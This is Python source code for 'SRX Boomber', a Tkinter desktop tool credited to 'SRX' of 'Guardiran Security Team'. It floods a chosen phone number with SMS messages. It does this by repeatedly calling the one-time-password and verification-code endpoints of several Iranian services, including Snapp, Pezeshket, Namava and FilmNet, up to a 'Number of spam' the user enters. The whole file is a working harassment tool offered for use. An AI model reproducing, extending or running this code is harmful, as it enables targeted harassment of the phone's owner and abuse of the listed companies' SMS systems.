from tkinter import *
import pyglet, os
from tkinter import ttk
import requests
from tkinter import messagebox as msbox
import sys
import webbrowser
import time

win = Tk()

now = os.getcwd()

pyglet.font.add_file(now+r"\fonts\HACKED.ttf")
pyglet.font.add_file(now+r"\fonts\Jura.ttf")
pyglet.font.add_file(now+r"\fonts\SonOfAGlitch.ttf")


def Guardiran_Security_Team():
    target = Enter_phone_number_use.get()
    q6 = msbox.showinfo('SRX Boomber', 'Service Started...')
    Num(target)
    
def Start_spam_SRX():
        url = "https://google.com"
        timeout = 5
        while True:
            try:
                request = requests.get(url, timeout=timeout)
                break;
            except (requests.ConnectionError, requests.Timeout) as exception:
                ok = msbox.askretrycancel('SRX Boomber', 'No internet connection.')
                if ok == False:
                    sys.exit()

        a = 0
        target = Enter_phone_number_use.get()
        Maximum = Enter_number_use.get()

        try:
            if target[0] == '0':
                q = msbox.askretrycancel('SRX Bommber', 'Enter the phone number without the first "0".')
                if q == False:
                    sys.exit()
            elif target[0] != '9':
                q1 = msbox.askretrycancel('SRX Boomber', 'Phone number must start with "9".')
                if q1 == False:
                    sys.exit()
            elif len(target) != 10:
                q5 = msbox.askretrycancel('SRX Boomber', 'Phone number is incorrect!')
                if q5 == False:
                    sys.exit()
            else:
                a += 1
        except IndexError:
            q2= msbox.askretrycancel('SRX Boomber', 'Enter the phone number!')
            if q2 == False:
                sys.exit()
            else:
                a += 1
        
        try:
            if 0 < int(Maximum) and len(target) == 10:
                a += 1
        except:
            q4 = msbox.askretrycancel('SRX Boomber', 'The number of submissions could not be empty.')
            if q4 == False:
                sys.exit()
                
        if a == 2:
            IP = requests.get("http://ip-api.com/json/").json()
            IP_country = IP['country']
                            
            if IP_country == 'Iran':
                Continue = msbox.askyesno(f'SRX Boomer', 'Your IP address is from Iran!\nContinue?')
                if Continue == True:
                    pass
                elif Continue == False:
                    sys.exit()
                    
            Check.configure(text='Checked!')
            Enter_number.configure(state='disable')
            Enter_phone_number.configure(state='disable')
                            
            Start_spam = ttk.Button(text='Start Service', command=Guardiran_Security_Team)
            Start_spam.place(relx=0.5 , rely=0.9 ,anchor ='s')

def Num(Num):

        target = Enter_phone_number_use.get()
        Maximum = int(Enter_number_use.get())

        heads ={                                                     
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',  
                'Accept': '*/*'                                                                         
            }                                                     

        #SNAPP
        snap_API = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
        snap_post = {"cellphone":"+98"+Num}

        #SNAPP MARKET
        snap_market_API = 'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0'+Num

        #PEZESHKET
        PEZESHKET_API = 'https://api.pezeshket.com/core/v1/auth/requestCode'
        PEZESHKET_POST = {"mobileNumber":"0"+Num}

        #NAMAVA
        NAMAVA_API = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
        NAMAVA_POST = {"UserName":"+98"+Num}

        #FILM NET
        FILM_NET_API = f'https://api-v2.filmnet.ir/access-token/users/0{Num}/otp'

        #SNAP DOCTOR
        SNAP_DOCTOR_API = f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{Num}/sms?cCode= 98'

        i = 0
        while True:
            if i <= int(Maximum) :
                try:
                    #SNAPP
                    requests.post(snap_API, data=snap_post)
                    i += 1
                    if i == Maximum:
                        break;
                except:
                    i -= 1
                    
                try:
                    #SNAPP MARKET
                    requests.post(snap_market_API)
                    i += 1
                    if i == Maximum:
                        break;
                except:
                    i -= 1

                try:
                    #PEZESHKET
                    requests.post(PEZESHKET_API, data=PEZESHKET_POST,  headers=heads)
                    i += 1
                    if i == Maximum:
                        break;
                except:
                    i -= 1

                try:
                    #NAMAVA
                    requests.post(NAMAVA_API, data=NAMAVA_POST,  headers=heads)
                    i += 1
                    if i == Maximum:
                        break;
                except:
                    i -= 1

                try:
                    #FILM NET
                    requests.get(FILM_NET_API)
                    i += 1
                    if i == Maximum:
                        break;
                except:
                    i -= 1

                try:
                    #SNAP DOCTOR
                    requests.options(SNAP_DOCTOR_API, headers=heads)
                    requests.get(SNAP_DOCTOR_API)
                    i += 1
                    if i == Maximum:
                        break;
                except:
                    i -= 1

                break;

        if i == Maximum:
            q7 = msbox.showinfo('SRX Bommber', 'Completed successfully!')
            os.system('start https://guardiran.org')
            time.sleep(3)
            sys.exit()

win.configure(background='#0e0e2e')
win.geometry('900x500')
win.resizable(0, 0)
win.title('SRX Boomber')
win.iconbitmap(now+r"\photo\Icon.ico")


logo = PhotoImage(file=now+r"\photo\Logo.gif")
logo_show = Label(win, image=logo, bg='#0e0e2e').place(relx=0.5 , rely=0.4 ,anchor ='s')


SRX_title = Label(win, text='SRX Boomber', font=('HACKED',57), bg='#0e0e2e', fg='red')
SRX_title.place(relx=0.5 , rely=0.556 ,anchor ='s')


Text_number = Label(win, text='Phone Number:', bg='#0e0e2e', fg='white', font=('Jura',15))
Text_number.place(relx=0.4 , rely=0.65 ,anchor ='s')

Enter_phone_number_use = StringVar()
Enter_phone_number = ttk.Entry(win, width=22, textvariable=Enter_phone_number_use, state='active')
Enter_phone_number.place(relx=0.56 , rely=0.64 ,anchor ='s')

Num_number = Label(win, text='Number of spam:', bg='#0e0e2e', fg='white', font=('Jura',15))
Num_number.place(relx=0.393 , rely=0.72 ,anchor ='s')

Enter_number_use = StringVar()
Enter_number = ttk.Entry(win, textvariable=Enter_number_use, width=22, state='active')
Enter_number.place(relx=0.56 , rely=0.71 ,anchor ='s')

Check = ttk.Button(text='Check', command=Start_spam_SRX)
Check.place(relx=0.5 , rely=0.82 ,anchor ='s')

Coded_by_SRX = Label(win, text='Coded by SRX', bg='#0e0e2e', fg='#2ee7b6', font=('Jura',15))
Coded_by_SRX.bind("<Button-1>", lambda e: webbrowser.open_new('https://guardiran.org/profile/30112-srx/'))
Coded_by_SRX.place(relx=0.06 , rely=1.0 ,anchor ='sw')

SRX_logo = PhotoImage(file=now+r"\photo\SRX.gif")
SRX_logo_show = Label(win, image=SRX_logo, bg='#0e0e2e').place(relx=0.0 , rely=1.0 ,anchor ='sw')

Guardiran = Label(win, text='Guardiran Security Team', bg='#0e0e2e', fg='#2ee7b6', font=('Jura',15))
Guardiran.bind("<Button-1>", lambda e: webbrowser.open_new('https://guardiran.org'))
Guardiran.place(relx=0.868 , rely=1.0 ,anchor ='s')

win.mainloop()